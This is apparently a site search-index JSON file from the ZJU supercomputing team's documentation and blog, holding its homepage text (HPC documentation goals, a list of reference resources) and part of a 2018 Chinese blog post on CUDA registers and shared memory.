{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Index","text":""},{"location":"#\u6b22\u8fce\u6765\u5230-zjusct-\u6587\u6863\u4e0e\u535a\u5ba2","title":"\u6b22\u8fce\u6765\u5230 ZJUSCT \u6587\u6863\u4e0e\u535a\u5ba2","text":"<p>\u8fd9\u662f \u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\uff08ZJUSCT\uff09 \u7684\u6587\u6863\u4e0e\u535a\u5ba2\uff0c\u4e3b\u8981\u9762\u5411 \u56e2\u961f\u6210\u5458\u53ca HPC \u7231\u597d\u8005\uff0c\u5305\u542b\u4e86\u6211\u4eec\u5728 \u9ad8\u6027\u80fd\u8ba1\u7b97\uff08HPC\uff09 \u9886\u57df\u7684\u6280\u672f\u79ef\u7d2f\u548c\u7ecf\u9a8c\u3002</p>"},{"location":"#-\u5feb\u901f\u5bfc\u822a","title":"\ud83d\ude80 \u5feb\u901f\u5bfc\u822a","text":"<p>Falcon</p> <p>ZJU Mirror \u548c\u955c\u50cf\u7ad9\u6587\u6863\u3002</p> <p>Blog</p> <p>ZJUSCT \u535a\u5ba2\u3002</p> <p>\u7ade\u8d5b</p> <p>\u7ade\u8d5b\u76f8\u5173\u6587\u6863\u3002</p> <p>\u8fd0\u7ef4</p> <p>\u786c\u4ef6\u3001\u8f6f\u4ef6\u3001\u7f51\u7edc\u3001\u53ef\u89c2\u6d4b\u6027\u7b49\u8fd0\u7ef4\u6587\u6863\u3002</p> <p>\u4f18\u5316</p> <p>\u5efa\u8bbe\u4e2d</p> <p>\u5185\u90e8\u8d44\u6599\uff08\u8bed\u96c0\uff09</p> <p>\u4e0d\u5b9c\u516c\u5f00\u7684\u5185\u90e8\u8d44\u6599\uff0c\u4ec5\u56e2\u961f\u6210\u5458\u6821\u5185\u8bbf\u95ee\u3002</p>"},{"location":"#-\u6587\u6863\u4ef7\u503c","title":"\ud83d\udcda \u6587\u6863\u4ef7\u503c","text":""},{"location":"#-\u77e5\u8bc6\u6c89\u6dc0","title":"\ud83d\udcdd \u77e5\u8bc6\u6c89\u6dc0","text":"<p>\u4e3a\u56e2\u961f\u7559\u5b58\u6280\u672f\u8d44\u4ea7 \u5728\u6784\u5efa\u7cfb\u7edf\u6216\u5de5\u5177\u65f6\uff0c\u6211\u4eec\u4f1a\u7ecf\u5386\u8d44\u6599\u68c0\u7d22\u3001\u5b9e\u8df5\u9a8c\u8bc1\u548c\u7ecf\u9a8c\u603b\u7ed3\u7684\u8fc7\u7a0b\uff0c\u6700\u7ec8\u6210\u679c\u5f80\u5f80\u6d53\u7f29\u4e3a\u914d\u7f6e\u6587\u4ef6\u6216\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u5fc5\u8981\u7684\u8bb0\u5f55\uff0c\u5c06\u6765\u7ef4\u62a4\u6216\u65b0\u4eba\u63a5\u624b\u65f6\u5f80\u5f80\u9700\u8981\u91cd\u65b0\u7ecf\u5386\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u8017\u65f6\u7684\u8fc7\u7a0b\u3002</p> <p>\u5efa\u8bae\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u540c\u6b65\u8bb0\u5f55\uff1a</p> <ul> <li>\u6784\u5efa\u6d41\u7a0b\u4e0e\u8bbe\u8ba1\u601d\u8def</li> <li>\u53c2\u8003\u7684\u77e5\u8bc6\u6765\u6e90</li> <li>\u9047\u5230\u7684\u95ee\u9898\u53ca\u89e3\u51b3\u65b9\u6848</li> </ul> <p>\u8fd0\u7ef4\u5de5\u4f5c\u5c24\u5176\u9700\u8981\u6587\u6863\u5316 \u76f8\u6bd4\u53e3\u5934\u4f20\u6388\uff0c\u6587\u6863\u80fd\uff1a</p> <ul> <li>\u51c6\u786e\u8bb0\u5f55\u64cd\u4f5c\u6b65\u9aa4</li> <li>\u7a33\u5b9a\u4f20\u627f\u8fd0\u7ef4\u7ecf\u9a8c</li> <li>\u4fdd\u969c\u56e2\u961f\u8fd0\u7ef4\u80fd\u529b\u6301\u7eed\u53d1\u5c55</li> </ul>"},{"location":"#-\u7ecf\u9a8c\u4f20\u627f","title":"\ud83e\udd1d \u7ecf\u9a8c\u4f20\u627f","text":"<p>HPC \u4f5c\u4e3a\u7cfb\u7edf\u5de5\u7a0b\uff0c\u9700\u8981\u56e2\u961f\u534f\u4f5c\u4e0e\u6280\u672f\u79ef\u7d2f\u3002\u6587\u6863\u5e2e\u52a9\u6211\u4eec\uff1a</p> <ul> <li>\u6c38\u4e45\u4fdd\u5b58\u5404\u7c7b\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848</li> <li>\u907f\u514d\u56e0\u4eba\u5458\u53d8\u52a8\u5bfc\u81f4\u77e5\u8bc6\u6d41\u5931</li> <li>\u4fc3\u8fdb\u6210\u5458\u95f4\u76f8\u4e92\u5b66\u4e60\u4e0e\u6280\u672f\u63d0\u5347</li> </ul>"},{"location":"#-\u65b0\u4eba\u6307\u5f15","title":"\ud83e\udded \u65b0\u4eba\u6307\u5f15","text":"<p>\u6280\u672f\u79ef\u7d2f\u53ef\u80fd\u6210\u4e3a\u65b0\u6210\u5458\u7684\u5165\u95e8\u58c1\u5792\u3002\u4f18\u8d28\u6587\u6863\u80fd\uff1a</p> <ul> <li>\u7f29\u77ed\u65b0\u4eba\u9002\u5e94\u5468\u671f</li> <li>\u63d0\u4f9b\u660e\u786e\u7684\u5b66\u4e60\u8def\u5f84</li> <li>\u964d\u4f4e\u56e2\u961f\u57f9\u517b\u6210\u672c</li> </ul> <p>\u6587\u6863\u4e0e\u5185\u8bad</p> <p>\u76f8\u6bd4\u4f20\u7edf\u5185\u8bad\uff0c\u6587\u6863\u5177\u5907\u663e\u8457\u4f18\u52bf\uff1a</p> <ul> <li>\u4f5c\u8005\u4e00\u6b21\u7f16\u5199\uff0c\u591a\u4eba\u53d7\u76ca</li> <li>\u652f\u6301\u5f02\u6b65\u81ea\u4e3b\u5b66\u4e60</li> <li>\u65f6\u95f4\u5b89\u6392\u7075\u6d3b\u9ad8\u6548</li> </ul>"},{"location":"#-\u5f00\u653e\u5171\u4eab","title":"\ud83c\udf10 \u5f00\u653e\u5171\u4eab","text":"<p>\u4e0e\u793e\u533a\u5171\u5efa\u77e5\u8bc6\u751f\u6001 \u6211\u4eec\u66fe\u4ece\u5f00\u6e90\u793e\u533a\u4e2d\u53d7\u76ca\u826f\u591a\uff0c\u5e0c\u671b\u901a\u8fc7\u6587\u6863\u5efa\u8bbe\u56de\u9988\u793e\u533a\uff1a</p> <ul> <li>\u4e0e\u56fd\u5185\u5916 HPC \u7231\u597d\u8005\u4ea4\u6d41\u6700\u4f73\u5b9e\u8df5</li> <li>\u53cd\u54fa\u5f00\u6e90\u793e\u533a\u7684\u6280\u672f\u53d1\u5c55</li> <li>\u9ad8\u6821\u56e2\u961f\u95f4\u7684\u65b9\u6848\u4e92\u9274</li> </ul>"},{"location":"#-\u53c2\u8003\u6587\u6863","title":"\ud83d\udcd6 \u53c2\u8003\u6587\u6863","text":"<p>\u56fd\u5185\u5916\u4f17\u591a\u9ad8\u6821\u3001\u7814\u7a76\u673a\u6784\u548c\u4f01\u4e1a\u90fd\u6709\u8d28\u91cf\u4e0d\u9519\u7684 HPC \u6559\u7a0b\u548c\u6587\u6863\u3002\u8fd9\u91cc\u5217\u51fa\u4e00\u4e9b\u6bd4\u8f83\u6709\u4ee3\u8868\u6027\u7684\u6587\u6863\uff0c\u4f9b\u5927\u5bb6\u53c2\u8003\u3002</p>"},{"location":"#\u56fd\u5185","title":"\u56fd\u5185","text":"\u5b66\u6821/\u673a\u6784 \u6587\u6863 \u7b80\u4ecb \u5317\u4eac\u5927\u5b66 hpcwiki.io LCPU \u53d1\u8d77\u7684\u793e\u533a\u9879\u76ee\uff0c\u76ee\u524d\u5904\u4e8e\u65e9\u671f\u9636\u6bb5\uff0c\u66f4\u65b0\u4e4f\u529b\u3002 \u6e05\u534e\u5927\u5b66 \u9ad8\u6027\u80fd\u8ba1\u7b97\u5bfc\u8bba\u5b9e\u9a8c\u6587\u6863 \u56fd\u5185\u6700\u597d\u7684 HPC \u8bfe\u7a0b\u4e4b\u4e00\u3002 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 LUG @ USTC USTC LUG \u7684\u6280\u672f\u6587\u6863\u3002 \u4e0a\u6d77\u4ea4\u901a\u5927\u5b66 \u4ea4\u6211\u7b97\u5e73\u53f0 \u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\u62e5\u6709\u56fd\u5185\u9ad8\u6821\u6700\u5927\u7684\u8d85\u7b97\u5e73\u53f0\u3002 \u4e0a\u6d77\u79d1\u6280\u5927\u5b66 GeekPie HPC Wiki GeekPie \u51e0\u4e4e\u6beb\u65e0\u4fdd\u7559\u5730\u5206\u4eab\u4e86\u4ed6\u4eec\u7684 HPC \u77e5\u8bc6\uff0c\u5305\u542b 19-22 \u8d85\u7b97\u8d5b\u9898\u3002"},{"location":"#\u56fd\u9645","title":"\u56fd\u9645","text":"\u5b66\u6821/\u673a\u6784 \u6587\u6863 \u7b80\u4ecb \u5362\u68ee\u5821\u5927\u5b66 ULHPC Technical Documentation \u5927\u89c4\u6a21\u6570\u636e\u4e2d\u5fc3\u6587\u6863\u7684\u5178\u8303\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u4e86\u8f6f\u786c\u4ef6\u914d\u7f6e\u3002 \u666e\u6797\u65af\u987f\u5927\u5b66 Princeton Research Computing \u666e\u6797\u65af\u987f\u5927\u5b66\u7684 HPC \u77e5\u8bc6\u5e93\uff0c\u4e13\u9898\u603b\u7ed3\u8d28\u91cf\u8f83\u9ad8\u3002 \u7f8e\u56fd\u6a61\u6811\u5cad\u56fd\u5bb6\u5b9e\u9a8c\u5ba4 OLCF User Documentation \u7f8e\u56fd\u80fd\u6e90\u90e8\u4e0b\u5c5e\u5b9e\u9a8c\u5ba4\u7684\u6587\u6863\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u91cd\u8981 HPC \u8f6f\u4ef6\u5982 Profiler\u3002 \u7f8e\u56fd\u4e1c\u5317\u5927\u5b66 Northeastern University Research Computing \u6db5\u76d6\u7814\u7a76\u8ba1\u7b97\u7684\u591a\u65b9\u9762\u5185\u5bb9\u3002 \u5fb7\u56fd\u79d1\u5b66\u57fa\u91d1\u4f1a hpc-wiki.info \u5185\u5bb9\u5b8c\u5584\u4f46\u8f83\u4e3a\u9648\u65e7\u3002"},{"location":"blog/","title":"Index","text":""},{"location":"blog/#zjusct\u6280\u672f\u535a\u5ba2","title":"ZJUSCT\uff08\u6280\u672f\uff09\u535a\u5ba2","text":""},{"location":"blog/2018/09/30/%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E8%B6%85%E7%AE%97%E9%98%9F%E5%8D%9A%E5%AE%A2%E6%B4%BB%E4%BA%86/","title":"\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\u535a\u5ba2...\u6d3b\u4e86\uff1f","text":"<p>\u8fd9\u91cc\u662f\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\u7684\u5b98\u65b9\u535a\u5ba2</p> <p>\u8bb0\u5f55\u4e00\u4e9b\u524d\u6cbf\u7684 Tech \u59ff\u52bf\u3001\u5927\u5bb6\u5e73\u65f6\u7684 DeBug \u7ecf\u5386\u3001\u8fd8\u6709 ASC \u4e16\u754c\u8d85\u7b97\u5927\u8d5b\u7684\u7ecf\u9a8c\u5206\u4eab\uff01</p> <p>\u5e0c\u671b\u8fd9\u4e2a\u535a\u5ba2\u4e0d\u4ec5\u4ec5\u662f\u7ed9\u4ee5\u540e\u7684\u5c0f\u76c6\u53cb\u4eec\u63d0\u4f9b\u5b9d\u8d35\u7684\u7ecf\u9a8c \u66f4\u662f\u8bf8\u541b\u6280\u672f\u7684\u8bb0\u5f55\u4e0e\u63d0\u5347\u7684\u5927\u597d\u673a\u4f1a</p> <p>\u5e73\u65f6\u6211\u4eec\u5199\u7740\u4ee3\u7801 \u603b\u662f\u4e0d\u613f\u610f\u5199\u6587\u6863 \u9047\u5230\u4e86\u975e\u5e38 Tricky \u53c8\u795e\u5947\u7684 Bug \u82b1\u4e86\u4e00\u4e0b\u5348\u7ec8\u4e8e\u89e3\u51b3\u4e86 \u5374\u6ca1\u6709\u8bb0\u5f55\u4e0b\u6765</p> <p>\u5f88\u6709\u53ef\u80fd\u5f88\u591a\u7684\u65e0\u8c13\u7684\u65f6\u95f4\u5c31\u4f1a\u5728\u4ee5\u540e\u88ab\u91cd\u590d \u8fd9\u6837\u7684\u65f6\u95f4\u6d6a\u8d39 \u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u8282\u7701\u4e0b\u6765\uff01</p> <p>\u5e0c\u671b\u5927\u5bb6\u80fd\u4eab\u53d7\u5728\u8d85\u7b97\u961f\u4e00\u8d77\u5b66\u4e60\u7684\u65f6\u5149~ \u4ece\u73b0\u5728\u5f00\u59cb \u628a\u8fd9\u6bb5\u7f8e\u597d\u7684\u65f6\u95f4\u53d8\u6210\u5b57\u7b26 \u8bb0\u5f55\u4e0b\u6765\u53ed~~</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/","title":"CUDA \u5185\u5b58\u7ba1\u7406\u603b\u7ed3 (\u4e00)","text":"<p>AI Generated Abstract</p> <p>\u672c\u7bc7\u535a\u5ba2\u603b\u7ed3\u4e86 CUDA \u5185\u5b58\u7ba1\u7406\u4e2d\u7684\u5bc4\u5b58\u5668\u548c\u5171\u4eab\u5185\u5b58\u7684\u57fa\u672c\u6982\u5ff5\u3001\u4f18\u5316\u65b9\u5f0f\u53ca\u5176\u5728 GPU \u7f16\u7a0b\u4e2d\u7684\u5e94\u7528\u3002\u901a\u8fc7\u5bf9\u5bc4\u5b58\u5668\u6620\u5c04\u65b9\u5f0f\u3001\u5171\u4eab\u5185\u5b58\u7684\u5b58\u50a8\u4f53\u67b6\u6784\u4ee5\u53ca\u4f18\u5316\u7b56\u7565\u7684\u8be6\u7ec6\u5206\u6790\uff0c\u7ed3\u5408\u5f52\u5e76\u6392\u5e8f\u7684\u793a\u4f8b\u4ee3\u7801\uff0c\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u5171\u4eab\u5185\u5b58\u548c\u5bc4\u5b58\u5668\u63d0\u5347 GPU \u7a0b\u5e8f\u6027\u80fd\u3002\u6b64\u5916\uff0c\u6587\u7ae0\u8fd8\u63a2\u8ba8\u4e86 atomicMin \u51fd\u6570\u3001\u5e76\u884c\u5f52\u7ea6\u4ee5\u53ca\u6df7\u5408\u7b97\u6cd5\u5728\u5171\u4eab\u5185\u5b58\u4f18\u5316\u4e2d\u7684\u5b9e\u9645\u5e94\u7528\uff0c\u4e3a CUDA \u7f16\u7a0b\u63d0\u4f9b\u4e86\u5b9e\u7528\u7684\u4f18\u5316\u601d\u8def\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5bc4\u5b58\u5668","title":"\u5bc4\u5b58\u5668","text":"<p>GPU \u7684\u6bcf\u4e2a SM\uff08\u6d41\u591a\u5904\u7406\u5668\uff09\u90fd\u6709\u4e0a\u5343\u4e2a\u5bc4\u5b58\u5668\uff0c\u6bcf\u4e2a SM \u90fd\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u591a\u7ebf\u7a0b\u7684 CPU \u6838\uff0c\u4f46\u4e0e\u4e00\u822c\u7684 CPU \u62e5\u6709\u4e8c\u3001\u56db\u3001\u516d\u6216\u516b\u4e2a\u6838\u4e0d\u540c\uff0c\u4e00\u4e2a GPU \u53ef\u4ee5\u6709N \u4e2a SM \u6838\uff1b\u540c\u6837\uff0c\u4e0e\u4e00\u822c\u7684 CPU \u6838\u652f\u6301\u4e00\u5230\u4e24\u4e2a\u786c\u4ef6\u7ebf\u7a0b\u4e0d\u540c\uff0c\u6bcf\u4e2a SM \u6838\u53ef\u80fd\u67098~192 \u4e2a SP\uff08\u6d41\u5904\u7406\u5668\uff09\uff0c\u4ea6\u5373\u6bcf\u4e2a SM \u80fd\u540c\u65f6\u652f\u6301\u8fd9\u4e48\u591a\u4e2a\u786c\u4ef6\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0c\u4e00\u53f0 GPU \u8bbe\u5907\u7684\u6240\u6709 SM \u4e2d\u6d3b\u8dc3\u7684\u7ebf\u7a0b\u6570\u76ee\u901a\u5e38\u6570\u4ee5\u4e07\u8ba1\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5bc4\u5b58\u5668\u6620\u5c04\u65b9\u5f0f","title":"\u5bc4\u5b58\u5668\u6620\u5c04\u65b9\u5f0f","text":"<p>CPU \u5904\u7406\u591a\u7ebf\u7a0b\uff1a\u8fdb\u884c\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u4f7f\u7528\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u673a\u5236\uff0c\u5c06\u5f53\u524d\u6240\u6709\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u4fdd\u5b58\u5230\u6808\uff08\u7cfb\u7edf\u5185\u5b58\uff09\uff0c\u518d\u4ece\u6808\u4e2d\u6062\u590d\u5f53\u524d\u9700\u8981\u6267\u884c\u7684\u65b0\u7ebf\u7a0b\u5728\u4e0a\u4e00\u6b21\u7684\u6267\u884c\u72b6\u6001\u3002\u8fd9\u4e9b\u64cd\u4f5c\u901a\u5e38\u82b1\u8d39\u4e0a\u767e\u4e2a CPU \u65f6\u949f\u5468\u671f\uff0c\u6709\u6548\u5de5\u4f5c\u541e\u5410\u91cf\u4f4e\u3002</p> <p>GPU \u5904\u7406\u591a\u7ebf\u7a0b\uff1a\u4e0e CPU \u76f8\u53cd\uff0cGPU \u5229\u7528\u591a\u7ebf\u7a0b\u9690\u85cf\u4e86\u5185\u5b58\u83b7\u53d6\u4e0e\u6307\u4ee4\u6267\u884c\u5e26\u6765\u7684\u5ef6\u8fdf\uff1b\u6b64\u5916\uff0cGPU \u4e0d\u518d\u4f7f\u7528\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u673a\u5236\uff0c\u800c\u662f\u5c3d\u53ef\u80fd\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u5bc4\u5b58\u5668\uff0c\u4ece\u800c\u4e0a\u4e0b\u6587\u5207\u6362\u5c31\u53d8\u6210\u4e86\u5bc4\u5b58\u5668\u7ec4\u9009\u62e9\u5668\uff08\u6216\u6307\u9488\uff09\u7684\u66f4\u65b0\uff0c\u51e0\u4e4e\u662f\u96f6\u5f00\u9500\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5bc4\u5b58\u5668\u7a7a\u95f4\u5927\u5c0f","title":"\u5bc4\u5b58\u5668\u7a7a\u95f4\u5927\u5c0f","text":"<p>\u6bcf\u4e2a SM \u53ef\u63d0\u4f9b\u7684\u5bc4\u5b58\u5668\u7a7a\u95f4\u5927\u5c0f\u5206\u522b\u6709 8KB\u300116KB\u300132KB \u548c 64KB\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u53d8\u91cf\u5360\u7528\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u56e0\u800c\u603b\u5171\u4f1a\u5360\u7528 N \u4e2a\u5bc4\u5b58\u5668\uff0cN \u4ee3\u8868\u8c03\u5ea6\u7684\u7ebf\u7a0b\u6570\u91cf\u3002\u5f53\u7ebf\u7a0b\u5757\u4e0a\u7684\u5bc4\u5b58\u5668\u6570\u76ee\u662f\u5141\u8bb8\u7684\u6700\u5927\u503c\u65f6\uff0c\u6bcf\u4e2a SM \u4f1a\u53ea\u5904\u7406\u4e00\u4e2a\u7ebf\u7a0b\u5757\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#sm-\u8c03\u5ea6\u7ebf\u7a0b\u7ebf\u7a0b\u5757","title":"SM \u8c03\u5ea6\u7ebf\u7a0b\u3001\u7ebf\u7a0b\u5757","text":"<p>\u7531\u4e8e\u5927\u591a\u6570\u5185\u6838\u5bf9\u5bc4\u5b58\u5668\u7684\u9700\u6c42\u91cf\u5f88\u4f4e\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u964d\u4f4e\u5bc4\u5b58\u5668\u7684\u9700\u6c42\u91cf\u6765\u589e\u52a0 SM \u4e0a\u7ebf\u7a0b\u5757\u7684\u8c03\u5ea6\u6570\u91cf\uff0c\u4ece\u800c\u63d0\u9ad8\u8fd0\u884c\u7684\u7ebf\u7a0b\u603b\u6570\uff0c\u6839\u636e\u7ebf\u7a0b\u7ea7\u5e76\u884c\u201c\u5360\u7528\u7387\u8d8a\u9ad8\uff0c\u7a0b\u5e8f\u8fd0\u884c\u8d8a\u5feb\u201d\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8fd0\u884c\u6548\u7387\u7684\u4f18\u5316\u3002\u5f53\u7ebf\u7a0b\u7ea7\u5e76\u884c\uff08Thread-Level Parallelism\uff0cTLP\uff09\u8db3\u4ee5\u9690\u85cf\u5b58\u50a8\u5ef6\u8fdf\u65f6\u4f1a\u8fbe\u5230\u4e00\u4e2a\u4e34\u754c\u70b9\uff0c\u6b64\u540e\u60f3\u8981\u7ee7\u7eed\u63d0\u9ad8\u7a0b\u5e8f\u6027\u80fd\uff0c\u53ef\u4ee5\u5728\u5355\u4e2a\u7ebf\u7a0b\u4e2d\u5b9e\u73b0\u6307\u4ee4\u7ea7\u7684\u5e76\u884c\uff08Instruction-Level Parallelism\uff0cILP\uff09\uff0c\u5373\u5355\u7ebf\u7a0b\u5904\u7406\u591a\u6570\u636e\u3002</p> <p>\u4f46\u5728\u53e6\u4e00\u65b9\u9762\uff0c\u6bcf\u4e2a SM \u6240\u80fd\u8c03\u5ea6\u7684\u7ebf\u7a0b\u603b\u91cf\u662f\u6709\u9650\u5236\u7684\uff0c\u56e0\u6b64\u5f53\u7ebf\u7a0b\u603b\u91cf\u8fbe\u5230\u6700\u5927\u65f6\uff0c\u518d\u51cf\u5c11\u5bc4\u5b58\u5668\u7684\u4f7f\u7528\u91cf\u5c31\u65e0\u6cd5\u8fbe\u5230\u63d0\u9ad8\u5360\u6709\u7387\u7684\u76ee\u7684\uff08\u5982\u4e0b\u8868\u4e2d\u5bc4\u5b58\u5668\u6570\u76ee\u7531 20 \u51cf\u5c0f\u4e3a 16\uff0c\u7ebf\u7a0b\u5757\u8c03\u5ea6\u6570\u91cf\u4e0d\u53d8\uff09\uff0c\u6240\u4ee5\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u589e\u52a0\u5bc4\u5b58\u5668\u7684\u4f7f\u7528\u91cf\u5230\u4e34\u754c\u503c\u3002</p> <p></p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5bc4\u5b58\u5668\u4f18\u5316\u65b9\u5f0f","title":"\u5bc4\u5b58\u5668\u4f18\u5316\u65b9\u5f0f","text":"<ol> <li>\u5c06\u4e2d\u95f4\u7ed3\u679c\u7d2f\u79ef\u5728\u5bc4\u5b58\u5668\u800c\u975e\u5168\u5c40\u5185\u5b58\u4e2d\u3002\u5c3d\u91cf\u907f\u514d\u5168\u5c40\u5185\u5b58\u7684\u5199\u64cd\u4f5c\uff0c\u56e0\u4e3a\u5982\u679c\u64cd\u4f5c\u805a\u96c6\u5230\u540c\u4e00\u5757\u5185\u5b58\u4e0a\uff0c\u5c31\u4f1a\u5f3a\u5236\u786c\u4ef6\u5bf9\u5185\u5b58\u7684\u64cd\u4f5c\u5e8f\u5217\u5316\uff0c\u5bfc\u81f4\u4e25\u91cd\u7684\u6027\u80fd\u964d\u4f4e\uff1b</li> <li>\u5faa\u73af\u5c55\u5f00\u3002\u5faa\u73af\u4e00\u822c\u975e\u5e38\u4f4e\u6548\uff0c\u56e0\u4e3a\u5b83\u4eec\u4f1a\u4ea7\u751f\u5206\u652f\uff0c\u9020\u6210\u6d41\u6c34\u7ebf\u505c\u6ede\u3002</li> </ol>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u4f7f\u7528\u5bc4\u5b58\u5668\u53ef\u4ee5\u6709\u6548\u6d88\u9664\u5185\u5b58\u8bbf\u95ee\uff0c\u6216\u63d0\u4f9b\u989d\u5916\u7684 ILP\uff0c\u4ee5\u6b64\u5b9e\u73b0 GPU \u5185\u6838\u51fd\u6570\u7684\u52a0\u901f\uff0c\u8fd9\u662f\u6700\u4e3a\u6709\u6548\u7684\u65b9\u6cd5\u4e4b\u4e00\u3002</p>"},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u5171\u4eab\u5185\u5b58","title":"\u5171\u4eab\u5185\u5b58","text":""},{"location":"blog/2018/11/25/cuda-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%80%BB%E7%BB%93-%E4%B8%80/#\u57fa\u672c\u6982\u5ff5","title":"\u57fa\u672c\u6982\u5ff5","text":"<ol> <li>\u5171\u4eab\u5185\u5b58\u5b9e\u9645\u4e0a\u662f\u53ef\u4ee5\u53d7\u7528\u6237\u63a7\u5236\u7684\u4e00\u7ea7\u7f13\u5b58\uff0c\u6bcf\u4e2a SM \u4e2d\u7684\u4e00\u7ea7\u7f13\u5b58\u548c\u5171\u4eab\u5185\u5b58\u5171\u7528\u4e00\u4e2a 64KB \u7684\u5185\u5b58\u6bb5\u3002</li> <li>\u5171\u4eab\u5185\u5b58\u7684\u5ef6\u8fdf\u5f88\u4f4e\uff0c\u5927\u7ea6\u6709 1.5TB/s \u7684\u5e26\u5bbd\uff0c\u800c\u5168\u5c40\u5185\u5b58\u4ec5\u4e3a 160GB/s\uff0c\u6362\u8a00\u4e4b\uff0c\u6709\u6548\u5229\u7528\u5171\u4eab\u5185\u5b58\u6709\u53ef\u80fd\u83b7\u5f97 7 \u500d\u7684\u52a0\u901f\u6bd4\u3002\u4f46\u5b83\u7684\u901f\u5ea6\u4f9d\u7136\u53ea\u6709\u5bc4\u5b58\u5668\u7684\u5341\u5206\u4e4b\u4e00\uff0c\u5e76\u4e14\u5171\u4eab\u5185\u5b58\u7684\u901f\u5ea6\u51e0\u4e4e\u5728\u6240\u6709 GPU \u4e2d\u90fd\u76f8\u540c\uff0c\u56e0\u4e3a\u5b83\u7531\u6838\u65f6\u949f\u9891\u7387\u9a71\u52a8\u3002</li> <li>\u53ea\u6709\u5f53\u6570\u636e\u91cd\u590d\u5229\u7528\u3001\u5168\u5c40\u5185\u5b58\u5408\u5e76\uff0c\u6216\u8005\u7ebf\u7a0b\u4e4b\u95f4\u6709\u5171\u4eab\u6570\u636e\uff08\u4f8b\u5982\u540c\u65f6\u8bbf\u95ee\u76f8\u540c\u5730\u5740\u7684\u5b58\u50a8\u4f53\uff09\u7684\u65f6\u5019\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u624d\u66f4\u5408\u9002\uff0c\u5426\u5219\u5c06\u6570\u636e\u76f4\u63a5\u4ece\u5168\u5c40\u5185\u5b58\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668\u6027\u80fd\u4f1a\u66f4\u597d\u3002</li> <li>\u5171\u4eab\u5185\u5b58\u662f\u57fa\u4e8e\u5b58\u50a8\u4f53\u5207\u6362\u7684\u67b6\u6784\uff08bank-switched architecture\uff09\uff0c\u8d39\u7c73\u67b6\u6784\u7684\u8bbe\u5907\u4e0a\u6709 32 \u4e2a\u5b58\u50a8\u4f53\u3002\u65e0\u8bba\u6709\u591a\u5c11\u7ebf\u7a0b\u53d1\u8d77\u64cd\u4f5c\uff0c\u6bcf\u4e2a\u5b58\u50a8\u4f53\u6bcf\u4e2a\u5468\u671f\u53ea\u6267\u884c\u4e00\u6b21\u64cd\u4f5c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u7ebf\u7a0b\u675f\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u5404\u8bbf\u95ee\u4e00\u4e2a\u5b58\u50a8\u4f53\uff0c\u90a3\u4e48\u6240\u6709\u7ebf\u7a0b\u7684\u64cd\u4f5c\u90fd\u53ef\u4ee5\u5728\u4e00\u4e2a\u5468\u671f\u5185\u540c\u65f6\u6267\u884c\uff0c\u4e14\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u72ec\u7acb\u4e92\u4e0d\u5f71\u54cd\u7684\u3002\u6b64\u5916\uff0c\u5982\u679c\u6240\u6709\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\u540c\u4e00\u5730\u5740\u7684\u5b58\u50a8\u4f53\uff0c\u4f1a\u89e6\u53d1\u4e00\u4e2a\u5e7f\u64ad\u673a\u5236\u5230\u7ebf\u7a0b\u675f\u4e2d\u7684\u6bc